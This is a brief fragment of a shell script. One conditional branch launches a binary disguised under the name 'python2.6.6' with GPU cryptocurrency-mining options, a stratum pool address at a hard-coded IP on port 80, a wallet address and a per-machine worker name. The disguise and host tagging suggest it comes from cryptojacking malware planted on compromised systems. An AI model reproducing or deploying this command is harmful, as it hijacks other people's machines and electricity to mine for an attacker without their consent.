...
then
    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 4 --cuda-block-size 512   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 131072
else
